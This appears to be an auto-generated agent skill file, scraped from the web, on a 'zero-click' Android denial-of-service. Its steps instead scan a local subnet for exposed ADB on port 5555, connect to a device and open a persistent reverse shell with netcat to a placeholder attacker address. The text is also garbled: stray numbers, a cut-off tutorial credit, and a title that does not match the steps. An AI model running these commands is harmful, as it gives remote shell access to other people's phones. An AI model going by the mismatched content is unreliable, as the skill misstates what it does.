# Skill: Zero click, silent, remote Android DoS

Auto-learned 2026-10-29 from the web (heuristic pass — ask for a refresh once an LLM key is configured).

## When to use
When the task mentions Zero click, silent, remote Android DoS.

## Steps
1. Step-by-step simulated exploitation (for authorized testing): 1
2. Install additional ADB tools: sudo apt update && sudo apt install adb android-sdk-platform-tools 4
3. Run a targeted scan for vulnerable Android devices: nmap -p 5555 --script=adb-info 192.168.1.0/24 5
4. Use NetHunter’s “HID Attack” (optional) to create a persistent reverse shell via ADB: adb connect 192.168.1.100:5555 adb shell "nohup nc -e /system/bin/sh <attacker_ip> 4444 &" Free tutorial resource: Luka

## Verify
- Re-check one fact against a second source before acting on it.
- Never run destructive commands from a single source.

## Sources
- CVE-2026-0049: Dissecting the 0-Click Android DNG Vulnerability
  https://www.mobilehackinglab.com/blog/dissecting-the-zero-click-android-dng-vulnerability
- CVE-2026-0073: Android Zero-Click RCE Nightmare - How Wireless ...
  https://undercodetesting.com/cve-2026-0073-android-zero-click-rce-nightmare-how-wireless-debugging-turns-your-phone-into-a-hackers-playground-video/
- Public PoC Drops for CVSS 9.8 Android Zero-Click CVE-2026-0073
  https://dailysecurityreview.com/resources/public-poc-drops-for-cvss-9-8-android-zero-click-cve-2026-0073/
